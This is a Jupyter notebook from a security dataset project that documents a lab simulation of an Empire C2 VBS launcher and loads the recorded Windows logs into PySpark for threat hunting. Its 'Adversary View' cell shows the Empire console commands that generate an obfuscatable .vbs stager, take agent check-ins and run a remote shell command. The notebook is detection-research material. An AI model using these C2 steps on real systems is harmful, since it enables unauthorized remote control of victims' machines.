{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Empire VBS Execution"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Author            | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2019/05/18 |\n",
    "| Modification Date | 2020/09/20 |\n",
    "| Tactics           | ['[TA0002](https://attack.mitre.org/tactics/TA0002)'] |\n",
    "| Techniques        | ['[T1059.005](https://attack.mitre.org/techniques/T1059/005)'] |\n",
    "| Tags              | ['VBS Script Execution'] |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries executing a VBS script as a launcher for initial access."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "| Dataset Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/execution/host/empire_launcher_vbs.zip](https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/execution/host/empire_launcher_vbs.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Notebooks\n",
    "Notebooks created by the community leveraging the mordor datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "| Author | Name | Link |\n",
    "|:-------|:-----|:-----|"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Simulation Plan"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "| Environment | Tool Type | Module |\n",
    "|:------------|:----------|:-------|\n",
    "| Mordor shire | C2 | [launcher](https://github.com/BC-SECURITY/Empire/blob/master/lib/stagers/windows/launcher_vbs.py) |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: listeners) > usestager windows/launcher_vbs\n",
    "(Empire: stager/windows/launcher_vbs) > info\n",
    "\n",
    "Name: VBS Launcher\n",
    "\n",
    "Description:\n",
    "  Generates a .vbs launcher for Empire.\n",
    "\n",
    "Options:\n",
    "\n",
    "  Name             Required    Value             Description\n",
    "  ----             --------    -------           -----------\n",
    "  Listener         True                          Listener to generate stager for.\n",
    "  Language         True        powershell        Language of the stager to generate.\n",
    "  StagerRetries    False       0                 Times for the stager to retry\n",
    "                                                connecting.\n",
    "  OutFile          False       /tmp/launcher.vbs File to output .vbs launcher to,\n",
    "                                                otherwise displayed on the screen.\n",
    "  Obfuscate        False       False             Switch. Obfuscate the launcher\n",
    "                                                powershell code, uses the\n",
    "                                                ObfuscateCommand for obfuscation types.\n",
    "                                                For powershell only.\n",
    "  ObfuscateCommand False       Token\\All\\1       The Invoke-Obfuscation command to use.\n",
    "                                                Only used if Obfuscate switch is True.\n",
    "                                                For powershell only.\n",
    "  UserAgent        False       default           User-agent string to use for the staging\n",
    "                                                request (default, none, or other).\n",
    "  Proxy            False       default           Proxy to use for request (default, none,\n",
    "                                                or other).\n",
    "  ProxyCreds       False       default           Proxy credentials\n",
    "                                                ([domain\\]username:password) to use for\n",
    "                                                request (default, none, or other).\n",
    "\n",
    "\n",
    "(Empire: stager/windows/launcher_vbs) > set Listener http\n",
    "(Empire: stager/windows/launcher_vbs) > execute\n",
    "\n",
    "[*] Stager output written out to: /tmp/launcher.vbs\n",
    "\n",
    "(Empire: stager/windows/launcher_vbs) > \n",
    "[*] Sending POWERSHELL stager (stage 1) to 172.18.39.5\n",
    "[*] New agent K47LRAEP checked in\n",
    "[+] Initial agent K47LRAEP from 172.18.39.5 now active (Slack)\n",
    "[*] Sending agent (stage 2) to K47LRAEP at 172.18.39.5\n",
    "\n",
    "(Empire: stager/windows/launcher_vbs) > agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "K47LRAEP ps 172.18.39.5     WORKSTATION5      THESHIRE\\pgustavo       powershell         2316   5/0.0    2020-09-04 20:10:07  http            \n",
    "\n",
    "(Empire: agents) > interact K47LRAEP\n",
    "(Empire: K47LRAEP) > \n",
    "(Empire: K47LRAEP) > shell whoami\n",
    "[*] Tasked K47LRAEP to run TASK_SHELL\n",
    "[*] Agent K47LRAEP tasked with task ID 1\n",
    "(Empire: K47LRAEP) > \n",
    "theshire\\pgustavo\n",
    "..Command execution completed.\n",
    "\n",
    "(Empire: K47LRAEP) > \n",
    "(Empire: K47LRAEP) > \n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Explore Mordor Dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Initialize Analytics Engine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from openhunt.mordorutils import *\n",
    "spark = get_spark()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Download & Process Mordor File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "mordor_file = \"https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/execution/host/empire_launcher_vbs.zip\"\n",
    "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Get to know your data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = spark.sql(\n",
    "'''\n",
    "SELECT Hostname,Channel,EventID, Count(*) as count\n",
    "FROM mordorTable\n",
    "GROUP BY Hostname,Channel,EventID\n",
    "ORDER BY count DESC\n",
    "'''\n",
    ")\n",
    "df.show(truncate=False)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "PySpark_Python3",
   "language": "python",
   "name": "pyspark3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
